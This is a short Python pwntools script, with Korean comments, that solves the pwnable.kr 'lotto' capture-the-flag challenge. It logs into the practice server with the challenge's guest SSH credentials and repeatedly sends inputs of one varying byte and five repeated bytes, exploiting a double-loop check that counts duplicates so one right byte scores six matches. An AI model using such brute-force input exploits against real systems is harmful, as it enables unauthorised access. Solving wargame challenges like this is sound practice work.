from pwn import *

s = ssh(host="pwnable.kr", user="lotto", password="guest", port=2222)

r = s.process("./lotto")

# lotto 번호를 체크하는 로직에서 이중 for문을 도는데
# 중복으로 체크하기 때문에 하나만 맞더라도 match 값을 6으로 만들 수 있다
# 하나만 바꿔서 맞도록 돌리다 보면 flag를 얻을 수 있다.
while True:
    for a in range(1,46):
        print(r.recv())
        r.sendline("1")
        print(r.recv())
        r.sendline(chr(a)+"\x01\x01\x01\x01\x01")
        print("SEND:",a,"11111")